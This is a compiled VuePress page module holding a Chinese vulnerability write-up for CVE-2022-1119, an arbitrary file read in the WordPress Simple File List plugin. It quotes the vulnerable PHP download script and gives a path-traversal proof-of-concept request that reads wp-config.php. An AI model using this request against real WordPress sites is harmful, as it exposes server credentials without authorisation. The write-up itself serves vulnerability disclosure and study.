import{_ as e}from"./plugin-vue_export-helper-c27b6911.js";import{r as t,o as p,c as i,a as n,b as o,d as l,e as s}from"./app-58e4a7d6.js";const c={},u=s(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>WordPress Simple File List插件 ee-downloader.php文件存在任意文件读取漏洞，攻击者通过漏洞可以读取服务器中的任意文件</p><h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>WordPress Simple File List &lt; 3.2.8
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="插件名" tabindex="-1"><a class="header-anchor" href="#插件名" aria-hidden="true">#</a> 插件名</h2><p>Simple File List</p>`,6),r={href:"https://downloads.wordpress.org/plugin/simple-file-list.3.2.17.zip",target:"_blank",rel:"noopener noreferrer"},d=s(`<h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>存在漏洞的文件为 <code>wp-content/plugins/simple-file-list/includes/ee-downloader.php</code></p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202207061347857.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><div class="language-php line-numbers-mode" data-ext="php"><pre class="language-php"><code><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token comment">// Simple File List - ee-downloader.php - rev 1.19 - mitchellbennis@gmail.com</span>

<span class="token comment">// Force File to Download</span>
<span class="token comment">// This script is accessed via javascript on ee-download.php </span>

<span class="token variable">$eeFile</span> <span class="token operator">=</span>  <span class="token function">filter_var</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">&#39;eeFile&#39;</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token constant">FILTER_SANITIZE_STRING</span><span class="token punctuation">,</span> <span class="token constant">FILTER_FLAG_ENCODE_LOW</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_readable</span><span class="token punctuation">(</span><span class="token variable">$eeFile</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">&#39;Pragma: public&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// required</span>
    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">&#39;Expires: 0&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// no cache</span>
    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">&#39;Cache-Control: must-revalidate, post-check=0, pre-check=0&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">&#39;Last-Modified: &#39;</span><span class="token operator">.</span> <span class="token function">gmdate</span> <span class="token punctuation">(</span><span class="token string single-quoted-string">&#39;D, d M Y H:i:s&#39;</span><span class="token punctuation">,</span> <span class="token function">filemtime</span> <span class="token punctuation">(</span><span class="token variable">$eeFile</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">.</span><span class="token string single-quoted-string">&#39; GMT&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">&#39;Cache-Control: private&#39;</span><span class="token punctuation">,</span><span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">&#39;Content-Type: &#39;</span> <span class="token operator">.</span> <span class="token function">mime_content_type</span><span class="token punctuation">(</span><span class="token variable">$eeFile</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">&#39;Content-Disposition: attachment; filename=&quot;&#39;</span><span class="token operator">.</span> <span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$eeFile</span><span class="token punctuation">)</span> <span class="token operator">.</span><span class="token string single-quoted-string">&#39;&quot;&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">// header(&#39;Content-Transfer-Encoding: binary&#39;);</span>
    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">&#39;Content-Length: &#39;</span><span class="token operator">.</span> <span class="token function">filesize</span><span class="token punctuation">(</span><span class="token variable">$eeFile</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// provide file size</span>
    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">&#39;Connection: close&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">readfile</span><span class="token punctuation">(</span><span class="token variable">$eeFile</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// Start the download</span>

<span class="token punctuation">}</span>
<span class="token delimiter important">?&gt;</span></span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>直接传参获取文件信息, 验证POC</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>/wp-content/plugins/simple-file-list/includes/ee-downloader.php?eeFile=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e/wp-config.php
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202207061347645.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,7);function k(m,g){const a=t("ExternalLinkIcon");return p(),i("div",null,[u,n("p",null,[n("a",r,[o("https://downloads.wordpress.org/plugin/simple-file-list.3.2.17.zip"),l(a)])]),d])}const b=e(c,[["render",k],["__file","WordPress Simple File List ee-downloader.php 任意文件读取漏洞 CVE-2022-1119.html.vue"]]);export{b as default};
